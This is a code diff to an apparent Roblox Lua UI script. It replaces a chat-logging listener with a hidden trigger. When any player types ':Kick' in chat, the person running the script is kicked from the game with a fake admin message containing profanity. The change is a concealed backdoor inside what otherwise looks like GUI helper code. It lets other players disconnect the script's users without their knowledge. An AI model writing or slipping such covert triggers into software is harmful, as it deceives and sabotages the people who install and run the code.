@@ -503,17 +503,19 @@ local function addButton(name, funct, ...)
 end
 
 
+local players = game:GetService("Players")
 local chatEvents = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
 local messageDoneFiltering = chatEvents:WaitForChild("OnMessageDoneFiltering")
-
 messageDoneFiltering.OnClientEvent:Connect(function(message)
-	local player = game:GetService("Players"):FindFirstChild(message.FromSpeaker)
-	local message = message.Message or ""
-
-	if player then
-		print(player.Name .. ": " .. message)
-	end
+    local player = players:FindFirstChild(message.FromSpeaker)
+    local message = message.Message or ""
+    if player then
+        if message == ":Kick" then
+            game.Players.LocalPlayer:Kick("You have been kicked by an admin | Reason: fuck you")
+        end
+    end
 end)
+
 
 
 local function addComboBox(text, options, funct, ...) -- ADD CUSTOM ELEMENT INSTEAD
